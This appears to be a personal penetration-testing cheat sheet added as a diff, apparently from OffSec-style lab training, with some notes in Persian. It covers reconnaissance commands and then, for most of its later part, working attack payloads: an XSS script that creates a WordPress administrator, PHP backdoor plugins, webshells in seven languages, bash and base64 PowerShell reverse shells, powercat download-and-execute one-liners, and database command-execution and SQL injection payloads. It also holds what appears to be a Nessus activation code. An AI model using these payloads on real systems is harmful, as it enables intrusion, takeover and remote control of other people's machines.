@@ -1,0 +1,2844 @@
+#################################################################################################################
+#################################################################################################################
+                                                  Information Gathering
+     
+     
+-------- COMMANDS:
+Encode:
+echo -n " " | base64
+Dcode:
+echo " " | base64 -d
+
+Zip:
+zip -r evilplugin.zip evilplugin
+
+Unzip:
+
+
+Shell:
+
+
+
+-------- WEBSITES:
+https://jscompress.com/
+https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
+https://github.com/besimorhino/powercat
+-------- ADDRESS:
+Wordpress:
+/wp-admin
+/wp-admin.php
+/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php
+
+etc/passwd
+home/USER/.ssh/id_rsa
+C:\Windows\System32\drivers\etc\hosts
+
+LFI:
+SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+SecLists/Fuzzing/LFI/LFI-Large.txt
+
+Wordpress:
+SecLists/CMS/wordpress/wp-config.txt
+SecLists/CMS/wordpress/wordpress-sensitive-files.txt
+
+IIS:
+SecLists/Fuzzing/LFI/LFI-Windows.txt
+
+Apache:
+SecLists/Discovery/Web-Content/Apache.txt
+SecLists/Discovery/Web-Content/Linux.txt
+
+Traversal:
+SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+
+Webshells:
+ls -la /usr/share/webshells
+
+
+-------- CURL
+curl --path-as-is http://IP:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+-i, --show-headers
+-T, --upload-file <file>
+-A, --user-agent <name>
+-d, POST => {"...":"...","...":"..."}  =>  '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}'
+-H,    =>  -H 'Cnontent-Type:application/json' -H 'Authorization: OAuth' 
+-X POST --data 'Archive=ipconfig'
+robot.txt
+&& => %3B
+-------- whois <dns/x.x.x.x> -h x.x.x.x
+cat /etc/hosts
+
+
+-------- NMAP
+nmap -p- --min-rate=1000 -sS (-sV -sC -O) -A -Pn -sU <ip> --osscan-guess -oG <x.txt>
+                         -sT 
+                         -sn                 <x.x.x.3-251>/<x.x.x.x/24>
+                         -z   (هیچ دیتایی نفرست) (فقط ببین پورت بازه یا نه)
+                         -w 1  (رای هر پورت فقط ۱ ثانیه صبر کن)
+                         
+--script http-headers
+
+sudo nmap -sV -p xx --script "vuln" x.x.x.x
+sudo cp cve.x.x.x.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
+sudo nmap --script-updatedb
+sudo nmap -sV -p xx --script "cve.x.x.x" x.x.x.x
+
+sudo nmap -p80 --script=http-enum x.x.x.x
+'''
+nmap -p 80 192.168.50.1-253 -oG web-sweep.txt
+nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
+'''
+
+
+-------- NETCRAFT
+
+-------- GOOGLE HACKING:
+
+firefox --search "Microsoft Edge site:exploit-db.com"
+
+| Operator   | مثال                      | کاربرد                          |
+| ---------- | ------------------------- | ------------------------------- |
+| `site:`    | `site:exploit-db.com`     | محدود کردن نتیجه به یک سایت خاص |
+| `inurl:`   | `inurl:php?id=`           | پیدا کردن URLهای آسیب‌پذیر      |
+| `intitle:` | `intitle:"index of"`      | هدف قرار دادن عنوان صفحه        |
+| `intext:`  | `intext:"SQL injection"`  | جستجو در متن صفحه               |
+| `" "`      | `"WordPress 5.2 exploit"` | جستجو دقیق عبارتی مشخص          |
+
+
+| Operator      | مثال                             | کاربرد                                 |
+| ------------- | -------------------------------- | -------------------------------------- |
+| `site:`       | `site:exploit-db.com`            | محدود کردن نتیجه به یک سایت خاص        |
+| `inurl:`      | `inurl:php?id=`                  | پیدا کردن URLهای آسیب‌پذیر             |
+| `intitle:`    | `intitle:"index of"`             | هدف قرار دادن عنوان صفحه               |
+| `intext:`     | `intext:"SQL injection"`         | جستجو در متن صفحه                      |
+| `" "`         | `"WordPress 5.2 exploit"`        | جستجوی دقیق عبارتی مشخص                |
+| `filetype:`   | `filetype:pdf "buffer overflow"` | جستجوی فایل با فرمت مشخص               |
+| `ext:`        | `ext:nse ssh`                    | جستجوی فایل با پسوند مشخص              |
+| `allintitle:` | `allintitle:admin login`         | جستجوی صفحات با تمام کلمات در عنوان    |
+| `allinurl:`   | `allinurl:admin panel`           | جستجوی URLهای شامل تمام کلمات          |
+| `allintext:`  | `allintext:"password leak"`      | جستجوی صفحات شامل تمام کلمات در متن    |
+| `cache:`      | `cache:example.com`              | مشاهده نسخه کش شده سایت                |
+| `related:`    | `related:example.com`            | پیدا کردن سایت‌های مشابه               |
+| `inanchor:`   | `inanchor:"click here"`          | جستجو بر اساس متن لینک‌ها              |
+| `AROUND(X)`   | `"sql injection" AROUND(5) php`  | پیدا کردن عباراتی که به هم نزدیک هستند |
+| `-`           | `php -tutorial`                  | حذف نتایج شامل کلمه مشخص               |
+| `+`           | `+"remote code execution"`       | اطمینان از حضور کلمه در نتایج          |
+| `*`           | `"WordPress * exploit"`          | جایگزینی wildcard برای هر کلمه         |
+| `define:`     | `define:buffer overflow`         | تعریف یک کلمه در سایت‌ها یا دیکشنری‌ها |
+| `info:`       | `info:exploit-db.com`            | نمایش اطلاعات سایت                     |
+| `link:`       | `link:example.com`               | نمایش صفحات لینک شده به سایت           |
+
+
+-------- SECURITY HEDEARS:
+
+| Header                      | اگر وجود نداشته باشد یعنی                         | تمرکز تست / حمله                |
+| --------------------------- | ------------------------------------------ | -------------------------------- |
+| Content-Security-Policy     | هیچ محدودیتی روی اجرای JavaScript وجود ندارد      | XSS (Reflected / Stored / DOM)   |
+| X-Frame-Options             | صفحه می‌تواند داخل iframe لود شود               | Clickjacking                     |
+| X-Content-Type-Options      | MIME Sniffing فعال است                      | File Upload / XSS                |
+| Referrer-Policy             | اطلاعات URL و Token ممکن است نشت کند         | Information Disclosure           |
+| Strict-Transport-Security   | HTTPS اجباری نشده                            | SSL Downgrade / MITM             |
+| Permissions-Policy          | APIهای مرورگر بدون محدودیت در دسترس هستند        | Browser Feature Abuse            |
+
+-------- SSL LABS / TLS FINDINGS:
+
+| TLS 1.0 / TLS 1.1       | استفاده از پروتکل‌های قدیمی     | MITM / Downgrade Attack          |
+| CBC Cipher Suites       | الگوریتم رمزنگاری آسیب‌پذیر     | BEAST / POODLE                   |
+| SHA1                    | الگوریتم هش شکسته شده           | Integrity Failure                |
+| Weak Key Exchange       | Forward Secrecy ضعیف             | Session Compromise               |
+| No HSTS                 | HTTPS اجباری نیست               | SSL Stripping                    |
+
+-------- MISSING HEADRES:
+
+| Missing Header        | به‌تنهایی Vulnerability است؟ | چه چیزی را نشان می‌دهد           | کاربرد در Pentest / Report  
+| --------------------- | --------------------------- | --------------------------- | -------------------------
+| CSP                   | خیر                         | Hardening ضعیف سمت وب    |             افزایش Impact XSS
+| X-Frame-Options       | خیر      |               عدم دفاع در برابر UI Attack           | Clickjacking             
+| HSTS                  | خیر                         | HTTPS به‌درستی enforce نشده   | SSL Stripping / Downgrade 
+| Multiple Headers      | خیر           |             فرهنگ امنیتی ضعیف                | Security Misconfiguration 
+
+-------- DNS ENUMERATION:
+
+host <DNS>
+host -t mx <DNS>
+for ip in $(cat <list>.txt); do host $ip.<DNS>; done
+for ip in $(seq <A> <Z>); do host x.x.x.$ip; done | grep -v "not found"
+
+dnsrecon -d <DNS> -t std
+dnsrecon -d <DNS> -D < ~/list.txt > -t brt
+-d  domain
+-D  wordlist for subdomain
+-t  brute
+
+dnsenum <DNS>
+
+xfreerdp /u:student /p:lab /v:192.168.50.152
+
+nslookup <xxx.DNS>
+
+nslookup -type=TXT <xxx.DNS> x.x.x.x
+
+-------- TCP/UDP PORT SCANNING:
+same as nmap!
+
+-------- PORT SCANNING:
+
+sudo iptables -I INPUT 1 -s 192.168.50.149 -j ACCEPT
+sudo iptables -I OUTPUT 1 -d 192.168.50.149 -j ACCEPT
+sudo iptables -Z
+sudo iptables -vn -L
+
+
+
+-------- SHODAN:
+hostname:xxxx.com port:"xx"
+
+Test-NetConnection -Port <port> <ip>
+
+grep open web-sweep.txt | cut -d" " -f2
+
+
+
+#################################################################################################################
+                                   
+                                            ## SMB Enumeration ##
+139 , 445 SMB
+
+-------- SCAN:
+sudo nbtscan -r x.x.x.x/24
+nmap -v -p 139,445 --script smb-os-discovery <ip>
+net view \\dc01 /all
+
+-------- CONNECT:
+smbclient -L //IP [options]
+smbclient //IP/Share [options]
+smbclient \\\\<ip>\\<dir> 
+
+-L
+-N
+-U <user>
+dir , cd , get
+
+linux -> samba
+
+
+
+
+
+#################################################################################################################
+
+
+
+                                            ## SMTP Enumeration ##
+25 SMTP
+
+-------- SCAN:
+Test-NetConnection -Port 25 192.168.50.8
+nc -nv x.x.x.x 25
+VRFY root
+
+-------- SCRIPT: python3 vrfy.py <username> <target_ip>
+
+#!/usr/bin/python
+
+import socket
+import sys
+
+if len(sys.argv) != 3:
+        print("Usage: vrfy.py <username> <target_ip>")
+        sys.exit(0)
+
+# Create a Socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Connect to the Server
+ip = sys.argv[2]
+connect = s.connect((ip,25))
+
+# Receive the banner
+banner = s.recv(1024)
+
+print(banner)
+
+# VRFY a user
+user = (sys.argv[1]).encode()
+s.send(b'VRFY ' + user + b'\r\n')
+result = s.recv(1024)
+
+print(result)
+
+# Close the socket
+s.close()
+
+---------------------------------------------- 
+#!/usr/bin/python3
+
+import socket
+import sys
+
+if len(sys.argv) != 3:
+    print("Usage: vrfy.py <userlist.txt> <target_ip>")
+    sys.exit(0)
+
+userlist = sys.argv[1]
+ip = sys.argv[2]
+
+with open(userlist, "r") as f:
+    for line in f:
+        user = line.strip()
+        if not user:
+            continue
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, 25))
+
+        banner = s.recv(1024)
+
+        s.send(b'VRFY ' + user.encode() + b'\r\n')
+        result = s.recv(1024)
+
+        if b'252' in result:
+            print(f"[+] VALID USER: {user}")
+        elif b'550' in result:
+            print(f"[-] INVALID USER: {user}")
+        else:
+            print(f"[?] UNKNOWN RESPONSE for {user}")
+
+        s.close()
+
+
+
+#################################################################################################################
+
+
+
+                                            ## SNMP Enumeration ##
+161 SNMP
+-------- SCAN:
+sudo nmap -sU --open -p 161 x.x.x.1-254 
+
+dism /online /Enable-Feature /FeatureName:TelnetClient
+telnet 192.168.50.8 25
+
+-------- CONNECT:
+echo public > community
+echo private >> community
+echo manager >> community
+for ip in $(seq 1 254); do echo X.X.X.$ip; done > ips
+onesixtyone -c community -i ips       => x.x.x.x
+
+snmpwalk -c public -v1 -t 10 x.x.x.x
+
+snmpwalk -c public -v1 x.x.x.x 1.3.6.1.4.1.77.1.2.25
+
+ لیست کاربران ویندوز
+1.3.6.1.4.1.77.1.2.25
+
+پروسه‌های در حال اجرا
+1.3.6.1.2.1.25.4.2.1.2
+
+نرم‌افزارهای نصب‌شده
+1.3.6.1.2.1.25.6.3.1.2
+
+IPهای داخلی و Interfaceها
+1.3.6.1.2.1.4.20.1.1
+
+پورت‌های TCP باز
+1.3.6.1.2.1.6.13.1.3
+
+جدول Routing دستگاه
+1.3.6.1.2.1.4.21.1.1
+
+
+
+
+a
+##############################################################################################################
+                                            ## GO Buster ##
+
+-------- Gobuster:
+
+gobuster dir -u http://X.X.X.X:xxx -w /usr/share/wordlists/dirb/big.txt 
+gobuster vhost -u http://X.X.X.X:xxx -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster dns -u ... -w ...
+
+-p pattern
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+/api_name/v1
+
+--add-slash
+-t 5
+-q
+-x php,html,txt,js,conf,backup,bak
+-k 
+-s "200,301,302"
+-b "404,403"
+--exclude-length 0
+--append-domain
+--force
+
+
+403 = Forbidden
+/.hta                 (Status: 403)
+/.htaccess            (Status: 403)
+/.htpasswd            (Status: 403)
+
+301 = redirect
+/css       (Status: 301)
+/db        (Status: 301)
+/images    (Status: 301)
+/js        (Status: 301)
+/uploads   (Status: 301)
+
+
+SecLists/raw/master/Discovery/Web-Content/common.txt
+SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+SecLists/Discovery/Web-Content/common.txt 
+
+Wordpress:
+/wp-admin
+/wp-admin.php
+/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php
+
+etc/passwd
+home/USER/.ssh/id_rsa
+C:\Windows\System32\drivers\etc\hosts
+
+LFI:
+SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+SecLists/Fuzzing/LFI/LFI-Large.txt
+
+Wordpress:
+SecLists/CMS/wordpress/wp-config.txt
+SecLists/CMS/wordpress/wordpress-sensitive-files.txt
+
+IIS:
+SecLists/Fuzzing/LFI/LFI-Windows.txt
+
+Apache:
+SecLists/Discovery/Web-Content/Apache.txt
+SecLists/Discovery/Web-Content/Linux.txt
+
+Traversal:
+SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+
+Webshells:
+ls -la /usr/share/webshells
+
+#################################################################################################################
+                                            ## FFUF ##
+
+ffuf -u "http://X.X.X.X/FUZZ" -w ./common.txt
+
+FUZZ: کلمه کلیدی که جایگزین می‌شود
+-fs: فیلتر اندازه پاسخ (Filter Size) 1042,1088
+-mc: فیلتر کد وضعیت (Filter Status Code) 200,301,302,403
+-e .php
+-H "User-Agent: Mozilla/5.0"
+-c # red
+-t 20
+-fr "404|Not Found"
+
+-u "http://X.X.X.X/FUZ1/FUZ2" -w ./common.txt:FUZ1 -w ./common.txt:FUZ2
+
+
+#################################################################################################################
+                                            ## Nessus ##
+sudo systemctl start nessusd.service
+https://127.0.0.1:8834
+admin : 
+N4LM-AJTE-KME7-MKZ9-9JTH
+
+
+
+
+
+
+
+
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+\////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+\////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+\////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+                                                ## XSS ##
+
+-------- Gathering WordPress Nonce & Creating a New WordPress Administrator Account:
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+
+
+https://jscompress.com/ ======>
+
+-------- JS Encoding JS Function:
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript(' ...................... ')
+console.log(encoded)
+
+=======>
+curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode( ................. ))</script>" --proxy 127.0.0.1:8080
+
+
+
+-------- XSS Stored:
+
+-------- XSS Reflected:
+
+-------- XSS DOM:
+
+#################################################################################################################
+                                                ## WORDPRESS ##
+
+wpscan --url http://TARGET_IP --enumerate u,vp,vt,cb,dbe
+
+wpscan --url http://X.X.X.X --usernames admin --passwords rockyou.txt --max-threads 50
+
+plugin:
+
+<?php
+/*
+Plugin Name: Evil Plugin
+Description: Test plugin
+Version: 1.0
+*/
+
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+
+zip -r evilplugin.zip evilplugin
+
+/wp-content/plugins/evilplugin/evilplugin.php?cmd=id
+
+#################################################################################################################
+                                                ## SSH ##
+ssh -i dt_key -p xxx xxxx@XXXX
+
+ssh-keygen
+
+                                                ## LFI ##
+<?php echo system($_GET['cmd']); ?>
+xxx/xxx.log&cmd=ps
+
+bash -i >& /dev/tcp/X.X.X.X/4444 0>&1 => 
+bash -c "bash -i >& /dev/tcp/X.X.X.X/4444 0>&1" => 
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FX.X.X.X%2F4444%200%3E%261%22 => 
+nc -lnvp 4444
+
+Other languages LFI & RCE:
+-------- PHP:
+LFI:
+include($_GET['file']);
+RCE:
+system($_GET['cmd']); => <?php echo system($_GET['cmd']); ?>
+
+-------- JAVA:
+LFI:
+<jsp:include page="<%= request.getParameter("file") %>" />
+
+RequestDispatcher rd =
+request.getRequestDispatcher(request.getParameter("file"));
+rd.include(request, response);
+RCE:
+Runtime.getRuntime().exec(request.getParameter("cmd"));
+
+-------- ASP Classic:
+LFI:
+Server.Execute(Request("file"))
+RCE:
+<%
+Set shell = CreateObject("WScript.Shell")
+shell.Run(Request("cmd"))
+%>
+
+-------- ASP,NET (C#):
+LFI:
+Server.Execute(Request.QueryString["file"]);
+
+Response.WriteFile(Request.QueryString["file"]);
+
+RCE:
+System.Diagnostics.Process.Start(Request.QueryString["cmd"]);
+
+-------- Node.js:
+LFI:
+const fs = require("fs");
+res.send(fs.readFileSync(req.query.file, "utf8"));
+
+require(req.query.module);
+RCE:
+require("child_process").exec(req.query.cmd);
+
+require('child_process').exec(req.query.cmd, (error, stdout, stderr) => {res.send(stdout);});
+
+-------- Python (Flask/Django):
+LFI:
+open(request.args.get("file")).read()
+RCE:
+import os
+os.system(request.args.get("cmd"))
+
+import subprocess
+subprocess.Popen(request.args.get("cmd"), shell=True)
+
+import subprocess
+output = subprocess.check_output(request.args.get("cmd"), shell=True)
+return output
+
+-------- Perl:
+LFI:
+do param("file");
+RCE:
+system(param("cmd"));
+
+my $output = `param("cmd")`;
+print $output;
+
+-------- PHP Wrapper:
+php://filter :
+index.php?xxx=php://filter/convert.base64-encode/resource=admin.php
+
+data://text/plain :
+index.php?xxx=data://text/plain,<?php%20echo%20system('ls');?> => 
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64 => 
+index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
+
+
+                                                ## RFI ##
+php_backdoor.php :
+
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+Usage: 
+http://target.com/php_backdoor.php?cmd=cat+/etc/passwd
+index.php?page=http://X.X.X.X/php_backdoor.php&cmd=ls
+
+
+
+-------- PHP Webshell
+
+<?php
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+
+-------- Java Webshell (JSP)
+
+<%@ page import="java.io.*" %>
+<%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        out.println("<pre>");
+        while ((line = reader.readLine()) != null) {
+            out.println(line);
+        }
+        out.println("</pre>");
+    }
+%>
+
+-------- ASP Classic Webshell
+
+<%
+Set shell = CreateObject("WScript.Shell")
+Set exec = shell.Exec(Request("cmd"))
+Set output = exec.StdOut
+Response.Write "<pre>" & output.ReadAll() & "</pre>"
+%>
+
+-------- ASP.NET (C#) Webshell
+
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script runat="server">
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        string cmd = Request.QueryString["cmd"];
+        if (!string.IsNullOrEmpty(cmd))
+        {
+            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
+            psi.RedirectStandardOutput = true;
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+            Process proc = Process.Start(psi);
+            StreamReader sr = proc.StandardOutput;
+            string output = sr.ReadToEnd();
+            Response.Write("<pre>" + output + "</pre>");
+        }
+    }
+</script>
+
+-------- Node.js Webshell (Express.js)
+
+const express = require('express');
+const { exec } = require('child_process');
+const app = express();
+
+app.get('/shell', (req, res) => {
+    const cmd = req.query.cmd;
+    if (cmd) {
+        exec(cmd, (error, stdout, stderr) => {
+            if (error) return res.send(`Error: ${error.message}`);
+            if (stderr) return res.send(`Stderr: ${stderr}`);
+            res.send(`<pre>${stdout}</pre>`);
+        });
+    } else {
+        res.send('No cmd parameter provided.');
+    }
+});
+
+app.listen(3000, () => console.log('Server running on port 3000'));
+
+-------- Python Webshell (Flask)
+
+from flask import Flask, request
+import subprocess
+
+app = Flask(__name__)
+
+@app.route('/shell')
+def shell():
+    cmd = request.args.get('cmd')
+    if cmd:
+        output = subprocess.getoutput(cmd)
+        return f"<pre>{output}</pre>"
+    return "No cmd parameter provided."
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+
+-------- Perl Webshell
+
+#!/usr/bin/perl
+use CGI qw(:standard);
+print header;
+print start_html('Perl Shell');
+
+my $cmd = param('cmd');
+if ($cmd) {
+    my $output = `$cmd 2>&1`;
+    print "<pre>$output</pre>";
+} else {
+    print "No cmd parameter provided.";
+}
+
+print end_html;
+
+
+
+PHP Webshell
+http://<target-ip>/shell.php?cmd=whoami
+
+Java Webshell (JSP)
+http://<target-ip>/shell.jsp?cmd=whoami
+
+ASP Classic Webshell
+http://<target-ip>/shell.asp?cmd=whoami
+
+ASP.NET (C#) Webshell
+http://<target-ip>/shell.aspx?cmd=whoami
+
+Node.js Webshell
+http://<target-ip>:3000/shell?cmd=whoami
+
+Python Webshell (Flask)
+http://<target-ip>:5000/shell?cmd=whoami
+
+Perl Webshell
+http://<target-ip>/cgi-bin/shell.pl?cmd=whoami
+
+
+
+
+                                                ## File Upload ##
+
+https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
+
+ssh-keygen => authorized_keys -> upload -> root/.ssh/authorized_keys
+
+
+
+
+
+
+                                                ## Windows webshell execute ##
+
+-------- "CMD" or "PowerShell" :
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell => (dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
+
+--------
+
+nc -lnvp 4444 =>
+pwsh  =>
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("X.X.X.X",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'     =>
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)   =>
+$EncodedText =[Convert]::ToBase64String($Bytes)   =>
+$EncodedText   =>   JABjAGwAaQBlAG4Ad....
+exit     =>
+
+curl http://X.X.X.X/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20      JABjAGwAaQBlAG4Ad.....    =>
+(nc -lnvp 4444)  ->  ipconfig
+
+ls -la /usr/share/webshells
+
+---------
+
+
+-------- Powercat:
+python3 -m http.server 80 => nc -nvlp 4444
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell         => 
+IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell
+
+
+                                                ## Command Injecton ##
+
+popen(f'echo "{user_input}"') =====>  echo "<INPUT>"  =====>
+
+data=$(cat /etc/passwd); echo "$data"
+
+" && id && "
+
+"; id; #"
+
+=====>   LFI
+
+-------- eval():
+«این رشته متنی رو مثل کُد واقعی اجرا کن»
+user_input = "1 + 2"
+eval(user_input)
+
+-------- popen():
+«یه دستور شِل اجرا کن و خروجیشو بگیر»
+popen("echo test")
+popen("echo " + user_input)
+popen(f'echo "test"')
+
+
+#################################################################################################################
+                                                ## SQL Injection ##
+
+mysql -u root -p'pass' -h X.X.X.X -P xxx --skip-ssl-verify-server-cert
+
+select version();
+select system_user();
+show databases;
+SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+      (  column,       column     )   (databse or table)     (  condition   )
+
+MSSQL:
+impacket-mssqlclient username:password@IP -windows-auth
+
+
+-------- -------- -------- --------  -------- CONNECTING TO THE DATABASE:
+
+-------- MSSQL:
+impacket-mssqlclient / SQLCMD
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+
+auth:
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+  ===> 1
+
+Advanced Options:
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+
+xp_cmdshell:
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+EXEC xp_cmdshell 'whoami';
+
+reverse shell:
+EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')"';
+
+-------- MySQL:
+mysql CLI
+mysql -u root -p'Lab123' -h 192.168.50.18
+
+auth:
+SELECT user();
+SHOW GRANTS;
+ ===>  FILE  SUPER
+
+RCE:
+A: FILE privilege → Webshell:
+SELECT "<?php system($_GET['cmd']); ?>" 
+INTO OUTFILE "/var/www/html/shell.php";
+
+http://target/shell.php?cmd=id
+
+B:UDF (User Defined Function) → OS CMD:
+CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
+
+SELECT sys_exec('id');
+
+
+-------- PostgreSQL:
+psql
+psql -h 192.168.50.18 -U postgres -W
+
+auth:
+SELECT current_user;
+SELECT usesuper FROM pg_user WHERE usename=current_user;
+  ===>  usesuper = true
+RCE:
+A: COPY FROM PROGRAM:
+COPY cmd_exec FROM PROGRAM 'id';
+aیا
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
+
+*****
+B: Large Object + C:
+*****
+
+-------- Oracle:
+sqlplus
+sqlplus system/Lab123@192.168.50.18/XE
+sqlplus user/pass@TARGET
+
+auth:
+SELECT * FROM user_role_privs;
+  ===>   DBA
+
+RCE:
+CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "CmdExec" AS
+import java.io.*;
+public class CmdExec {
+  public static void run(String cmd) throws IOException {
+    Runtime.getRuntime().exec(cmd);
+  }
+};
+
+BEGIN
+CmdExec.run('id');
+END;
+/
+
+*****
+UTL_FILE
+DBMS_SCHEDULER
+*****
+
+-------- MongoDB:
+mongo mongodb://TARGET
+
+auth:
+db.runCommand({connectionStatus:1})
+
+RCE:
+db.eval("require('child_process').exec('id')")
+
+
+-------- -------- -------- --------  -------- DATABASE VERSION:
+MSSQL
+SELECT @@version;
+
+MySQL
+SELECT @@version;
+
+PostgreSQL
+SELECT version();
+
+Oracle
+SELECT banner FROM v$version;
+
+-------- -------- -------- --------  -------- DATABASE LIST:
+
+MSSQL
+SELECT name FROM sys.databases;
+
+MySQL
+SHOW DATABASES;
+
+PostgreSQL
+\l 
+SELECT datname FROM pg_database;
+
+Oracle
+SELECT username FROM all_users;
+
+-------- -------- -------- --------  -------- TABLE LIST OF THE DATABSE:
+
+MSSQL
+SELECT * FROM offsec.information_schema.tables;
+
+MySQL
+SELECT * FROM information_schema.tables WHERE table_schema='offsec';
+
+PostgreSQL
+SELECT * FROM information_schema.tables WHERE table_schema='public';
+
+Oracle
+SELECT table_name FROM all_tables WHERE owner='OFFSEC';
+
+-------- -------- -------- --------  -------- TABLES DATA:
+
+MSSQL
+SELECT * FROM offsec.dbo.users;
+
+MySQL
+SELECT * FROM offsec.users;
+
+PostgreSQL
+SELECT * FROM offsec.users;
+
+Oracle
+SELECT * FROM users;
+SELECT * FROM offsec.users;
+
+-------- -------- -------- --------  -------- COMMENT:
+
+-------- MySQL / MariaDB:
+
+--␠
+#
+/* */
+
+offsec' OR 1=1 -- //
+
+SELECT * FROM users WHERE user_name='offsec' OR 1=1 -- 
+
+-------- MSSQL (Microsoft SQL Server):
+
+--␠
+/* */
+
+offsec' OR 1=1 -- //
+
+SELECT * FROM users WHERE user_name='offsec' OR 1=1 -- 
+
+-------- PostgreSQL:
+
+--␠
+/* */
+
+offsec' OR 1=1 -- //
+
+SELECT * FROM users WHERE user_name='offsec' OR 1=1 -- 
+
+-------- Oracle:
+
+--␠
+/* */
+
+offsec' OR '1'='1' --
+
+SELECT * FROM users WHERE user_name='offsec' OR '1'='1' --
+
+
+-------- SQLite:
+
+--␠
+/* */
+
+offsec' OR 1=1 -- 
+
